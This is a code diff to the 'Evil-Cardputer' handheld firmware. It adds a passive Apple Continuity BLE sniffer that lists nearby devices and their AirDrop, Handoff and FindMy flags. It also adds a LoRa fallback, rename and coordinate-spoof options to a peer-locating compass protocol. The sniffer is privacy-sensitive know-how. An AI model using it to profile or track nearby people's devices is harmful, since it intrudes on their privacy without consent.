+    sp.setTextColor(0x5AEB, TFT_BLACK);
+    sp.setCursor(4, y);
+    sp.printf("%s%s%s%s%s",
+      d.hasAirdrop      ? "AirDrop " : "",
+      d.hasHandoff      ? "Handoff " : "",
+      d.hasSiri         ? "Siri "    : "",
+      d.hasNearbyAction ? "Action "  : "",
+      d.hasFindMy       ? "FindMy"   : "");
+  }
+
+  sp.fillRect(0, H - 13, W, 13, AC_BAR);
+  sp.setTextColor(TFT_YELLOW, AC_BAR);
+  sp.setCursor(4, H - 11); sp.print(";/. prev/next");
+  sp.setTextColor(TFT_GREEN, AC_BAR);
+  sp.setCursor(184, H - 11); sp.print("BACK");
+
+  if (use_sprite) sprite->pushSprite(0, 0);
+}
+
+// Detail view navigable item-to-item with up/down across the filtered list,
+// refreshing live. Returns the final position so the caller can sync the list.
+int ac_show_detail(M5Canvas* sprite, bool use_sprite, int filter, int pos) {
+  int fidx[AC_MAX];
+  uint32_t lastDraw = 0;
+  enterDebounce();
+  while (true) {
+    int fcount = ac_build_filter(filter, fidx);
+    if (fcount == 0) return pos;
+    if (pos >= fcount) pos = fcount - 1;
+    if (pos < 0) pos = 0;
+
+    M5.update();
+    cardUpdate();
+    if (kp(KEY_BACKSPACE) || kp(KEY_ENTER)) { keyRelease(); return pos; }
+    if (kp('.'))      { keyRelease(); pos = (pos + 1) % fcount; lastDraw = 0; }
+    else if (kp(';')) { keyRelease(); pos = (pos - 1 + fcount) % fcount; lastDraw = 0; }
+
+    if (millis() - lastDraw > 400) {
+      lastDraw = millis();
+      ac_draw_detail(sprite, use_sprite, fidx[pos], pos, fcount);
+    }
+    delay(20);
+  }
+}
+void appleContinuityMenu() {
+  keyRelease();
+  M5Canvas* sprite = new (std::nothrow) M5Canvas(&M5.Display);
+  bool use_sprite = false;
+  if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(240, 135); }
+
+  WiFi.mode(WIFI_OFF);
+  delay(50);
+  if (!BLEDevice::getInitialized()) BLEDevice::init("");
+  isBLEInitialized = true;
+
+  portENTER_CRITICAL(&ac_mux); ac_count = 0; portEXIT_CRITICAL(&ac_mux);
+
+  BLEScan* scan = BLEDevice::getScan();
+  scan->stop();
+  scan->clearResults();
+  scan->setAdvertisedDeviceCallbacks(&ac_scan_cb, true);
+  scan->setActiveScan(true);         // active: also pull scan-response with the local name
+  scan->setInterval(160);
+  scan->setWindow(160);
+  scan->start(0, nullptr, false);
+
+  int sel = 0, top = 0, filter = 0;
+  const int maxVis = 7;
+  int fidx[AC_MAX];
+  int fcount = 0;
+  uint32_t lastDraw = 0;
+  enterDebounce();
+
+  while (true) {
+    M5.update();
+    cardUpdate();
+    if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+
+    fcount = ac_build_filter(filter, fidx);
+    if (sel >= fcount) sel = (fcount > 0) ? fcount - 1 : 0;
+
+    if (kp('/'))      { keyRelease(); filter = (filter + 1) % AC_FILTERS; sel = 0; top = 0; fcount = ac_build_filter(filter, fidx); lastDraw = 0; }
+    else if (kp(',')) { keyRelease(); filter = (filter - 1 + AC_FILTERS) % AC_FILTERS; sel = 0; top = 0; fcount = ac_build_filter(filter, fidx); lastDraw = 0; }
+    else if (kp('.') && fcount > 0) { keyRelease(); sel = (sel + 1) % fcount; lastDraw = 0; }
+    else if (kp(';') && fcount > 0) { keyRelease(); sel = (sel - 1 + fcount) % fcount; lastDraw = 0; }
+
+    if (sel < top) top = sel;
+    if (sel >= top + maxVis) top = sel - maxVis + 1;
+
+    if (kp(KEY_ENTER) && fcount > 0) { keyRelease(); sel = ac_show_detail(sprite, use_sprite, filter, sel); lastDraw = 0; }
+
+    if (millis() - lastDraw > 500) { lastDraw = millis(); ac_draw_list(sprite, use_sprite, filter, fidx, fcount, sel, top); }
+    delay(20);
+  }
+
+  scan->stop();
+  scan->setAdvertisedDeviceCallbacks(nullptr);
+  scan->clearResults();
+  if (sprite) { sprite->deleteSprite(); delete sprite; }
+  releaseBLE();
+  waitAndReturnToMenu("Apple sniff stopped");
+}
+
+// =====================================================================
 // =================== Totem Compass Protocol ========================
 // =====================================================================
 // Rewritten from TotemCardputer(1).ino reference (tested working)
@@ -39350,7 +41165,7 @@ void csiRadarMenu() {
 #define TOTEM_PEER_TIMEOUT 60000
 #define TOTEM_TX_INTERVAL 800
 #define TOTEM_CHANNEL 6
-#define TOTEM_DEVICE_NAME "Evil-Cardputer"
+#define TOTEM_DEVICE_NAME_DEFAULT "Evil-Cardputer"
 #define TOTEM_PAIR_SECS 60
 #define TOTEM_BONDING_RSSI -55
 #define TOTEM_MESH_TX_MS 6000
@@ -39442,6 +41257,158 @@ TaskHandle_t totem_ble_tx_task = nullptr;
 uint32_t totem_ble_last_peer_sync = 0;
 bool totem_ble_active = false;
 
+// ── LoRa SX1262 hybrid (Cap LoRa 1262 on Cardputer ADV) ──
+
+#define TOTEM_LORA_NSS      5
+#define TOTEM_LORA_IRQ      4   // DIO1
+#define TOTEM_LORA_RST      3
+#define TOTEM_LORA_BUSY     6
+#define TOTEM_LORA_FREQ     868.0f
+#define TOTEM_LORA_BW       250.0f
+#define TOTEM_LORA_SF       11
+#define TOTEM_LORA_CR       5
+#define TOTEM_LORA_SYNC     0x34
+#define TOTEM_LORA_POWER    22
+#define TOTEM_LORA_PREAMBLE 20
+#define TOTEM_LORA_TCXO     3.0f
+#define TOTEM_LORA_TX_INTERVAL 4000
+
+// Hybride ESP-NOW <-> LoRa : LoRa prend le relais quand ESP-NOW est perdu depuis N ms.
+#define TOTEM_ESPNOW_LOST_MS 8000
+// 1 = LoRa seul (test) ; 0 = hybride ESP-NOW + LoRa avec basculement automatique.
+#define TOTEM_LORA_ONLY 0
+
+uint32_t totem_last_espnow_rx = 0;  // millis de la derniere trame ESP-NOW recue (0 = jamais)
+bool     totem_relay_lora    = false; // etat courant : true = LoRa relais actif
+
+SX1262* totem_sx = nullptr;
+Module* totem_sx_mod = nullptr;
+bool totem_lora_on = false;
+volatile bool totem_lora_irq_flag = false;
+uint32_t totem_lora_tx_cnt = 0;
+uint32_t totem_lora_rx_cnt = 0;
+uint32_t totem_lora_last_tx = 0;
+bool totem_lora_transmitting = false;
+
+void IRAM_ATTR totem_lora_isr() { totem_lora_irq_flag = true; }
+
+bool totem_lora_start() {
+    pinMode(TOTEM_LORA_NSS, OUTPUT);
+    digitalWrite(TOTEM_LORA_NSS, HIGH);
+    // Probe SPI : lit 3x un registre SX126x. Une vraie puce est deterministe
+    // (lectures identiques) ; sans HAT le MISO flotte -> lectures incoherentes ou
+    // 0000/FFFF. On rejette VITE dans ce cas pour NE PAS bloquer sur begin()
+    // (le begin() RadioLib attend reset/BUSY -> 5-10s de freeze si pas de puce).
+    auto lora_probe = [&]() -> uint16_t {
+        SPI.beginTransaction(SPISettings(2000000, MSBFIRST, SPI_MODE0));
+        digitalWrite(TOTEM_LORA_NSS, LOW);
+        SPI.transfer(0x1D); SPI.transfer(0x03); SPI.transfer(0x20);
+        uint8_t m = SPI.transfer(0x00);
+        uint8_t l = SPI.transfer(0x00);
+        digitalWrite(TOTEM_LORA_NSS, HIGH);
+        SPI.endTransaction();
+        return ((uint16_t)m << 8) | l;
+    };
+    uint16_t id1 = lora_probe(); uint16_t id2 = lora_probe(); uint16_t id3 = lora_probe();
+    if (id1 != id2 || id2 != id3 || id1 == 0x0000 || id1 == 0xFFFF) {
+        Serial.printf("[LORA] no SX1262 (id=%04X/%04X/%04X)\n", id1, id2, id3);
+        return false;
+    }
+
+    totem_sx_mod = new(std::nothrow) Module(TOTEM_LORA_NSS, TOTEM_LORA_IRQ,
+                                             TOTEM_LORA_RST, TOTEM_LORA_BUSY, SPI);
+    if (!totem_sx_mod) return false;
+    totem_sx = new(std::nothrow) SX1262(totem_sx_mod);
+    if (!totem_sx) { delete totem_sx_mod; totem_sx_mod = nullptr; return false; }
+
+    int16_t st = totem_sx->begin(TOTEM_LORA_FREQ, TOTEM_LORA_BW, TOTEM_LORA_SF,
+                                  TOTEM_LORA_CR, TOTEM_LORA_SYNC, TOTEM_LORA_POWER,
+                                  TOTEM_LORA_PREAMBLE, TOTEM_LORA_TCXO, false);
+    if (st != RADIOLIB_ERR_NONE) {
+        Serial.printf("[LORA] SX1262 begin err %d\n", st);
+        delete totem_sx; delete totem_sx_mod;
+        totem_sx = nullptr; totem_sx_mod = nullptr;
+        return false;
+    }
+    totem_sx->setDio2AsRfSwitch(true);
+    totem_sx->setCurrentLimit(140.0);
+    totem_sx->setDio1Action(totem_lora_isr);
+    totem_sx->startReceive();
+    totem_lora_on = true;
+    totem_lora_tx_cnt = 0; totem_lora_rx_cnt = 0;
+    Serial.printf("[LORA] SX1262 ok %.0fMHz SF%d BW%.0f %ddBm\n",
+                  TOTEM_LORA_FREQ, TOTEM_LORA_SF, TOTEM_LORA_BW, TOTEM_LORA_POWER);
+    return true;
+}
+
+void totem_lora_stop() {
+    if (totem_sx) { totem_sx->standby(); delete totem_sx; totem_sx = nullptr; }
+    if (totem_sx_mod) { delete totem_sx_mod; totem_sx_mod = nullptr; }
+    totem_lora_on = false; totem_lora_irq_flag = false;
+    totem_lora_transmitting = false;
+}
+
+void totem_lora_tx(const uint8_t* mac, const uint8_t* data, size_t len) {
+    if (!totem_lora_on || !totem_sx || totem_lora_transmitting || 6 + len > 255) return;
+    uint32_t now = millis();
+    static uint32_t totem_lora_tx_gap = TOTEM_LORA_TX_INTERVAL;
+    if (now - totem_lora_last_tx < totem_lora_tx_gap) return;
+    totem_lora_last_tx = now;
+    // Jitter anti-collision (half-duplex broadcast) : 2000 +/- 600 ms
+    totem_lora_tx_gap = TOTEM_LORA_TX_INTERVAL - 600 + (esp_random() % 1201);
+    uint8_t pkt[256];
+    memcpy(pkt, mac, 6);
+    memcpy(pkt + 6, data, len);
+    totem_lora_irq_flag = false;
+    totem_lora_transmitting = true;
+    totem_sx->startTransmit(pkt, 6 + len);
+}
+
+void totem_lora_rx() {
+    if (!totem_lora_on || !totem_sx || !totem_lora_irq_flag) return;
+    totem_lora_irq_flag = false;
+    if (totem_lora_transmitting) {
+        totem_lora_transmitting = false;
+        totem_lora_tx_cnt++;
+        totem_sx->startReceive();
+        return;
+    }
+    size_t plen = totem_sx->getPacketLength();
+    if (plen < 10 || plen > 255) { totem_sx->startReceive(); return; }
+    uint8_t pkt[256];
+    int16_t st = totem_sx->readData(pkt, plen);
+    if (st != RADIOLIB_ERR_NONE) { totem_sx->startReceive(); return; }
+    if (pkt[6] != 0xA7 || pkt[7] != 0x74) { totem_sx->startReceive(); return; }
+    int pi = totem_find_peer(pkt);
+    if (pi >= 0 && totem_peers[pi].active && millis() - totem_peers[pi].last_seen < 1500) {
+        totem_sx->startReceive();
+        return;
+    }
+    TotemRxFrame rxf = {};
+    memcpy(rxf.mac, pkt, 6);
+    rxf.rssi = (int8_t)totem_sx->getRSSI();
+    rxf.receivedAt = millis();
+    if (pkt[8] == 0xC0) {
+        // Trame compacte -> reconstruit un beacon minimal pour totem_handle_rx (inchange)
+        uint8_t nl = pkt[18]; if (nl > 20) nl = 20; if (19 + nl > (int)plen) nl = 0;
+        memset(rxf.data, 0, sizeof(rxf.data));
+        rxf.data[0] = 0xA7; rxf.data[1] = 0x74; rxf.data[2] = 0; rxf.data[3] = 0;
+        memcpy(rxf.data + 4, pkt + 9, 4);   // lat
+        memcpy(rxf.data + 8, pkt + 13, 4);  // lon
+        rxf.data[16] = pkt[17];             // sos
+        rxf.data[70] = nl;
+        if (nl) memcpy(rxf.data + 71, pkt + 19, nl);
+        rxf.len = 71 + nl;
+    } else {
+        rxf.len = plen - 6;
+        if (rxf.len > sizeof(rxf.data)) rxf.len = sizeof(rxf.data);
+        memcpy(rxf.data, pkt + 6, rxf.len);
+    }
+    if (totem_rx_queue) { xQueueSend(totem_rx_queue, &rxf, 0); totem_lora_rx_cnt++; }
+    totem_sx->startReceive();
+}
+// ── LoRa SX1262 end ──
+
 // ── Helpers ──
 
 void totemPutF(uint8_t *b, size_t o, float v)    { memcpy(b+o, &v, 4); }
@@ -39523,7 +41490,7 @@ bool totem_send(const uint8_t* mac, const uint8_t* data, size_t len) {
 
 size_t totem_build_beacon(uint8_t* b, uint8_t cmd, uint8_t ack,
                           float lat, float lon, const uint8_t* target) {
-    const size_t nameLen = strlen(TOTEM_DEVICE_NAME);
+    const size_t nameLen = strlen(totem_device_name);
     const size_t len = 71 + nameLen + 5;
     memset(b, 0, len);
     b[0] = 0xA7; b[1] = 0x74; b[2] = 0; b[3] = cmd;
@@ -39549,7 +41516,7 @@ size_t totem_build_beacon(uint8_t* b, uint8_t cmd, uint8_t ack,
     totemPutI32(b, 60, 0);
     totemPutI32(b, 64, 0);
     b[68] = 0; b[69] = 0; b[70] = (uint8_t)nameLen;
-    memcpy(b + 71, TOTEM_DEVICE_NAME, nameLen);
+    memcpy(b + 71, totem_device_name, nameLen);
     size_t o = 71 + nameLen;
     b[o] = 0; b[o+1] = 1; totemPutU16(b, o+2, 0); b[o+4] = 100;
     return len;
@@ -39614,6 +41581,25 @@ void totem_load_bonds() {
         int idx = totem_find_peer(blob + 1 + i * 6);
         if (idx >= 0) { totem_peers[idx].bonded = true; totem_add_espnow_peer(blob + 1 + i * 6); }
     }
+}
+
+void totem_save_name() {
+    if (!SD.exists(configFolderPath)) SD.mkdir(configFolderPath);
+    String content = "";
+    bool found = false;
+    File f = SD.open(configFilePath, FILE_READ);
+    if (f) {
+        while (f.available()) {
+            String line = f.readStringUntil('\n');
+            if (line.startsWith("totem_name=")) { content += "totem_name=" + String(totem_device_name) + "\n"; found = true; }
+            else { content += line + "\n"; }
+        }
+        f.close();
+    }
+    if (!found) content += "totem_name=" + String(totem_device_name) + "\n";
+    f = SD.open(configFilePath, FILE_WRITE);
+    if (f) { f.print(content); f.close(); }
+    Serial.printf("[TOTEM] name saved: %s\n", totem_device_name);
 }
 
 // ── Control ACK ──
@@ -39731,6 +41717,7 @@ void totem_promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
 
 void totem_espnow_recv_cb(const uint8_t* mac, const uint8_t* data, int len) {
     if (!totem_rx_queue || !mac || !data || len <= 0 || len > 250) return;
+    totem_last_espnow_rx = millis();  // liveness ESP-NOW (pour basculement LoRa)
     TotemRxFrame frame = {};
     memcpy(frame.mac, mac, 6);
     frame.rssi = totem_last_rssi;
@@ -39886,7 +41873,7 @@ void totem_ble_tx_worker(void*) {
 }
 
 size_t totem_ble_build_static(uint8_t* b) {
-    const char* name = TOTEM_DEVICE_NAME;
+    const char* name = totem_device_name;
     size_t nameLen = min((size_t)strlen(name), (size_t)20);
     const char branch[] = "totem";
     size_t branchLen = 5;
@@ -40227,14 +42214,18 @@ void totemCompassMenu() {
     memset(totem_recent, 0, sizeof(totem_recent));
     memset(totem_peers, 0, sizeof(totem_peers));
     totem_flash_until = 0; totem_group_uid = 0; totem_group_until = 0;
+#if !TOTEM_LORA_ONLY
     esp_now_register_recv_cb(totem_espnow_recv_cb);
+#endif
     totem_add_espnow_peer(TOTEM_BCAST);
     if (esp_wifi_get_mac(WIFI_IF_STA, totem_my_mac) != ESP_OK || memcmp(totem_my_mac, "\0\0\0\0\0\0", 6) == 0)
         esp_read_mac(totem_my_mac, ESP_MAC_WIFI_STA);
     totem_load_bonds();
-    Serial.printf("[TOTEM] up: %02X:%02X:%02X:%02X:%02X:%02X LR/ch%d BLE=%s heap=%u\n",
+    totem_lora_start();
+    Serial.printf("[TOTEM] up: %02X:%02X:%02X:%02X:%02X:%02X LR/ch%d LoRa=%s BLE=%s heap=%u\n",
         totem_my_mac[0], totem_my_mac[1], totem_my_mac[2],
         totem_my_mac[3], totem_my_mac[4], totem_my_mac[5], TOTEM_CHANNEL,
+        totem_lora_on ? "on" : "off",
         totem_ble_active ? "on" : "off(mode7)", ESP.getFreeHeap());
     auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
 
@@ -40373,12 +42364,10 @@ void totemCompassMenu() {
     if (compass_mode && !gps.location.isValid()) {
         M5.Display.clear(TFT_BLACK);
         M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
-        M5.Display.setCursor(10, 30); M5.Display.print("No GPS fix detected!");
-        M5.Display.setCursor(10, 50); M5.Display.print("Compass needs GPS for");
-        M5.Display.setCursor(10, 62); M5.Display.print("distance/bearing.");
-        M5.Display.setCursor(10, 82); M5.Display.print("Continuing as scanner...");
-        M5.Display.display(); delay(2000);
-        compass_mode = false;
+        M5.Display.setCursor(10, 30); M5.Display.print("Waiting for GPS fix...");
+        M5.Display.setCursor(10, 50); M5.Display.print("Compass will activate");
+        M5.Display.setCursor(10, 62); M5.Display.print("when satellites found.");
+        M5.Display.display(); delay(1000);
     }
 
     // Spoofer coordinate input
@@ -40441,6 +42430,8 @@ void totemCompassMenu() {
     bool imu_available = M5.Imu.isEnabled();
     bool imu_calibrated = false;
     float imu_heading = 0;
+    float imu_gyro_bias = 0;   // biais yaw projete (calibre par 'n')
+    bool gps_head_lock = false; // hysteresis cap GPS (anti-flicker)
     unsigned long imu_last_us = micros();
 
     // ═══════════════ MAIN LOOP ═══════════════
@@ -40448,13 +42439,24 @@ void totemCompassMenu() {
         M5.update(); cardUpdate();
         unsigned long now = millis();
 
-        // ── RX queue ──
+        // ── RX queue (ESP-NOW + LoRa) ──
+        totem_lora_rx();
         TotemRxFrame rxf;
         while (totem_rx_queue && xQueueReceive(totem_rx_queue, &rxf, 0) == pdTRUE)
             totem_handle_rx(rxf);
 
         // ── GPS ──
         while (cardgps.available() > 0) gps.encode(cardgps.read());
+
+        // ── Recalcul LIVE bearing/distance (coherence liste<->compass) ──
+        if (gps.location.isValid()) {
+            float _mlat = gps.location.lat(), _mlon = gps.location.lng();
+            for (int i = 0; i < totem_peer_count; i++)
+                if (totem_peers[i].lat != 0 || totem_peers[i].lon != 0) {
+                    totem_peers[i].distance = totem_get_distance(_mlat, _mlon, totem_peers[i].lat, totem_peers[i].lon);
+                    totem_peers[i].bearing  = totem_get_azimuth(_mlat, _mlon, totem_peers[i].lat, totem_peers[i].lon);
+                }
+        }
 
         // ── Build active peer order (sorted by RSSI) ──
         int order[TOTEM_MAX_PEERS]; int oc = 0;
@@ -40489,6 +42491,20 @@ void totemCompassMenu() {
                 for (int i = 0; i < totem_peer_count; i++)
                     if (!totem_peers[i].bonded) totem_peers[i].active = false;
             }
+            if (kp('r') || kp('R')) { keyRelease();
+                M5Cardputer.Display.fillScreen(TFT_BLACK);
+                M5Cardputer.Display.setTextColor(TFT_GREEN);
+                M5Cardputer.Display.setCursor(5, 20);
+                M5Cardputer.Display.printf("Name: %s", totem_device_name);
+                M5Cardputer.Display.setCursor(5, 40);
+                M5Cardputer.Display.print("New name (max 20):");
+                String newName = getUserInput();
+                if (newName.length() > 0 && newName.length() <= TOTEM_NAME_MAX) {
+                    strncpy(totem_device_name, newName.c_str(), TOTEM_NAME_MAX);
+                    totem_device_name[TOTEM_NAME_MAX] = 0;
+                    totem_save_name();
+                }
+            }
             if (kp(KEY_ENTER) && page == TPAGE_PEERS && selected < oc) {
                 keyRelease(); infoPeer = order[selected]; page = TPAGE_INFO;
             }
@@ -40508,7 +42524,24 @@ void totemCompassMenu() {
         else if (page == TPAGE_COMPASS) {
             if (kp('n') || kp('N')) {
                 keyRelease();
-                if (imu_available) { imu_heading = 0; imu_calibrated = true; }
+                if (imu_available) {
+                    sp.fillRect(0, 58, W, 16, TFT_BLACK);
+                    sp.setTextColor(TFT_YELLOW); sp.setCursor(24, 62);
+                    sp.print("Calibrating... hold still");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+                    float sum = 0; int ns = 0; uint32_t t0 = millis();
+                    while (millis() - t0 < 800) {
+                        M5.Imu.update();
+                        float ax, ay, az, gx, gy, gz;
+                        if (M5.Imu.getAccel(&ax, &ay, &az) && M5.Imu.getGyro(&gx, &gy, &gz)) {
+                            float an = sqrtf(ax*ax + ay*ay + az*az);
+                            if (an > 0.1f) { ax/=an; ay/=an; az/=an; sum += gx*ax + gy*ay + gz*az; ns++; }
+                        }
+                        delay(5);
+                    }
+                    imu_gyro_bias = ns ? sum / ns : 0;
+                    imu_heading = 0; imu_calibrated = true; imu_last_us = micros();
+                }
             }
         }
         else if (page == TPAGE_DEMIGOD) {
@@ -40549,11 +42582,12 @@ void totemCompassMenu() {
             if (kp(KEY_ENTER)) { keyRelease(); totem_send_cap_query(); }
         }
 
-        // ── TX ──
+        // ── TX (ESP-NOW + LoRa) ──
         bool pairing = (now < totem_pair_until);
         unsigned long tx_interval = pairing ? (50 + (esp_random() % 51)) : TOTEM_TX_INTERVAL;
         if (now - last_tx >= tx_interval) {
             last_tx = now;
+#if !TOTEM_LORA_ONLY
             if (pairing) {
                 if (totem_bond_latched) totem_send_pair_beacon(totem_bond_mac, true);
                 else totem_send_pair_beacon(TOTEM_BCAST, false);
@@ -40564,19 +42598,40 @@ void totemCompassMenu() {
                 float lon = gps.location.isValid() ? gps.location.lng() : 0;
                 totem_send_position(lat, lon);
             }
+            totem_relay_lora = (int32_t)(now - totem_last_espnow_rx) > (int32_t)TOTEM_ESPNOW_LOST_MS;
+            if (totem_lora_on && !pairing && totem_relay_lora) {
+#else
+            totem_relay_lora = true;
+            if (totem_lora_on) {
+#endif
+                float lat = spoof_mode ? spoof_lat : (gps.location.isValid() ? gps.location.lat() : 0);
+                float lon = spoof_mode ? spoof_lon : (gps.location.isValid() ? gps.location.lng() : 0);
+                // Trame LoRa COMPACTE (tag 0xC0): magic+lat+lon+sos+nom -> ToA court
+                uint8_t lbuf[64];
+                size_t nl = strlen(totem_device_name); if (nl > 20) nl = 20;
+                lbuf[0] = 0xA7; lbuf[1] = 0x74; lbuf[2] = 0xC0;
+                memcpy(lbuf + 3, &lat, 4);
+                memcpy(lbuf + 7, &lon, 4);
+                lbuf[11] = totem_sos ? 1 : 0;
+                lbuf[12] = (uint8_t)nl;
+                memcpy(lbuf + 13, totem_device_name, nl);
+                totem_lora_tx(totem_my_mac, lbuf, 13 + nl);
+            }
         }
+#if !TOTEM_LORA_ONLY
         if (TOTEM_MESH_TX_MS > 0 && now - last_mesh >= TOTEM_MESH_TX_MS) {
             last_mesh = now;
             float lat = gps.location.isValid() ? gps.location.lat() : 0;
             float lon = gps.location.isValid() ? gps.location.lng() : 0;
             totem_send_mesh(lat, lon);
         }
+#endif
 
         // Expire pair latch + old peers
         if (totem_bond_latched && now >= totem_pair_until) totem_bond_latched = false;
         if (totem_group_until && now >= totem_group_until) { totem_group_uid = 0; totem_group_until = 0; }
         for (int i = 0; i < totem_peer_count; i++)
-            if (totem_peers[i].active && now - totem_peers[i].last_seen > TOTEM_PEER_TIMEOUT)
+            if (totem_peers[i].active && (int32_t)(now - totem_peers[i].last_seen) > (int32_t)TOTEM_PEER_TIMEOUT)
                 totem_peers[i].active = false;
 
         // IMU gyro integration for heading tracking
@@ -40585,10 +42640,25 @@ void totemCompassMenu() {
             float dt = (now_us - imu_last_us) / 1000000.0f;
             imu_last_us = now_us;
             if (dt > 0 && dt < 0.5f) {
-                float gx, gy, gz;
-                if (M5.Imu.getGyro(&gx, &gy, &gz)) {
-                    imu_heading += gz * dt;
-                    imu_heading = fmodf(imu_heading + 360.0f, 360.0f);
+                float ax, ay, az, gx, gy, gz;
+                if (M5.Imu.getGyro(&gx, &gy, &gz) && M5.Imu.getAccel(&ax, &ay, &az)) {
+                    // Yaw projete sur l'axe gravite (marche a plat ET debout)
+                    float an = sqrtf(ax*ax + ay*ay + az*az);
+                    if (an > 0.1f) {
+                        ax /= an; ay /= an; az /= an;
+                        float yawRate = gx*ax + gy*ay + gz*az;          // deg/s
+                        float gmag = sqrtf(gx*gx + gy*gy + gz*gz);
+                        if (gmag < 2.0f) {
+                            // Immobile -> ZUPT : affine le biais, n'integre pas (zero derive)
+                            imu_gyro_bias += 0.02f * (yawRate - imu_gyro_bias);
+                        } else {
+                            float rate = yawRate - imu_gyro_bias;
+                            if (fabsf(rate) > 0.6f) {                    // deadband anti-derive
+                                imu_heading -= rate * dt;
+                                imu_heading = fmodf(imu_heading + 360.0f, 360.0f);
+                            }
+                        }
+                    }
                 }
             }
         } else {
@@ -40616,15 +42686,20 @@ void totemCompassMenu() {
         sp.fillRect(0, 0, W, 13, 0x0841);
         sp.setTextColor(totem_sos ? warn : (pairing ? good : 0xFC00));
         sp.setCursor(2, 3);
-        sp.printf("TOTEM %s [%d] %s%s", state.c_str(), oc,
+        sp.printf("TOTEM %s [%d] %s%s%s", state.c_str(), oc,
                   gps.location.isValid() ? "GPS " : "",
+                  totem_lora_on ? "LR+ " : "",
                   totem_sos ? "SOS" : "");
         sp.drawFastHLine(0, 13, W, 0x03E0);
 
         // ── Stats row ──
         sp.setTextColor(TFT_DARKGREEN); sp.setCursor(2, 15);
-        sp.printf("rx%lu b%lu p%lu r%lu", totem_stats.rx, totem_stats.bonds,
-                  totem_stats.pairRx, totem_stats.relayed);
+        if (totem_lora_on)
+            sp.printf("%c rx%lu b%lu Ltx%lu Lrx%lu", totem_relay_lora ? 'L' : 'E',
+                      totem_stats.rx, totem_stats.bonds, totem_lora_tx_cnt, totem_lora_rx_cnt);
+        else
+            sp.printf("rx%lu b%lu p%lu r%lu", totem_stats.rx, totem_stats.bonds,
+                      totem_stats.pairRx, totem_stats.relayed);
 
         int y = 26;
 
@@ -40657,7 +42732,7 @@ void totemCompassMenu() {
             }
             sp.fillRect(0, H-14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H-11);
-            sp.print(";/. sel ENTER=info s=SOS x=clr");
+            sp.print(";/. ENTER=info s=SOS r=name");
         }
 
         // ═══ PAGE: INFO ═══
@@ -40692,68 +42767,78 @@ void totemCompassMenu() {
             float bearing = hasPos ? totem_get_azimuth(myLat, myLon, p.lat, p.lon) : 0;
             float dist = hasPos ? totem_get_distance(myLat, myLon, p.lat, p.lon) : 0;
 
+            // GPS heading first (absolute, no drift) when moving, with
+            // hysteresis to avoid flicker from GPS speed noise; it also
+            // re-syncs the IMU (drift correction). Otherwise IMU (relative).
             float devHeading = 0;
             bool hasHeading = false;
-            if (imu_available && imu_calibrated) {
-                devHeading = imu_heading;
-                hasHeading = true;
-            } else if (gps.course.isValid() && gps.speed.kmph() > 3.0) {
-                devHeading = gps.course.deg();
-                hasHeading = true;
+            int headSrc = 0;   // 0=none 1=GPS 2=IMU
+            float spd = gps.speed.kmph();
+            if (gps.course.isValid() && (spd > 3.0 || (gps_head_lock && spd > 1.0))) {
+                gps_head_lock = true;
+                devHeading = gps.course.deg(); hasHeading = true; headSrc = 1;
+                if (imu_available) { imu_heading = devHeading; imu_calibrated = true; }
+            } else {
+                gps_head_lock = false;
+                if (imu_available && imu_calibrated) { devHeading = imu_heading; hasHeading = true; headSrc = 2; }
             }
 
             float arrowAngle = hasPos ? (bearing - devHeading) : 0;
             float rad = arrowAngle * 0.017453292f;
 
             // Compass circle
-            int cx = W / 2, cy = 52;
-            int cr = 38;
+            int cx = W / 2, cy = 82;
+            int cr = 32;
             sp.drawCircle(cx, cy, cr, TFT_DARKGREEN);
             sp.drawCircle(cx, cy, cr - 1, TFT_DARKGREEN);
 
             // Cardinal points
+            // Cardinals rotate with heading so N always points to true North
             sp.setTextColor(TFT_DARKGREEN);
-            sp.setCursor(cx - 2, cy - cr - 9); sp.print("N");
-            sp.setCursor(cx - 2, cy + cr + 2); sp.print("S");
-            sp.setCursor(cx + cr + 3, cy - 3); sp.print("E");
-            sp.setCursor(cx - cr - 9, cy - 3); sp.print("W");
+            {
+                const char* cn[4] = {"N", "E", "S", "W"};
+                for (int c = 0; c < 4; c++) {
+                    float ca = (c * 90.0f - devHeading) * 0.017453292f;
+                    int lx = cx + (int)(sinf(ca) * (cr + 7)) - 3;
+                    int ly = cy - (int)(cosf(ca) * (cr + 7)) - 3;
+                    sp.setTextColor(c == 0 ? TFT_RED : TFT_DARKGREEN); // N en rouge
+                    sp.setCursor(lx, ly); sp.print(cn[c]);
+                }
+            }
 
             if (hasPos) {
-                // Arrow pointing toward target
+                // Aiguille : verte si cap fiable (GPS/IMU), orange si Nord-relatif
+                uint16_t arrowCol = hasHeading ? TFT_GREEN : sp.color565(255, 140, 0);
                 int ax = cx + (int)(sinf(rad) * (cr - 6));
                 int ay = cy - (int)(cosf(rad) * (cr - 6));
                 int bx = cx + (int)(sinf(rad - 2.8f) * 10);
                 int by = cy - (int)(cosf(rad - 2.8f) * 10);
                 int dx = cx + (int)(sinf(rad + 2.8f) * 10);
                 int dy = cy - (int)(cosf(rad + 2.8f) * 10);
-                sp.fillTriangle(ax, ay, bx, by, dx, dy, TFT_GREEN);
-                // Small dot at center
+                sp.fillTriangle(ax, ay, bx, by, dx, dy, arrowCol);
                 sp.fillCircle(cx, cy, 2, TFT_WHITE);
+                if (!hasHeading) { sp.setTextColor(sp.color565(255,140,0)); sp.setCursor(cx - 16, cy + cr + 10); sp.print("N-up"); }
             } else {
                 sp.setTextColor(TFT_YELLOW);
                 sp.setCursor(cx - 20, cy - 3); sp.print("No GPS");
             }
 
-            // Peer info - right side / top
+            // Peer info + distance above compass
             char ms[10]; snprintf(ms, 10, "%02x:%02x:%02x", p.mac[3], p.mac[4], p.mac[5]);
             sp.setTextColor(TFT_GREEN);
             sp.setCursor(2, y); sp.printf("%s %s", ms, p.name[0] ? p.name : "?"); y += 10;
-
-            // Distance + bearing text at bottom right
             sp.setTextColor(TFT_CYAN);
+            sp.setCursor(2, y);
             if (hasPos) {
-                sp.setCursor(2, 96);
-                if (dist >= 1000) sp.printf("%.1fkm  %s  %.0f", dist / 1000.0f, totem_dir_str(bearing), bearing);
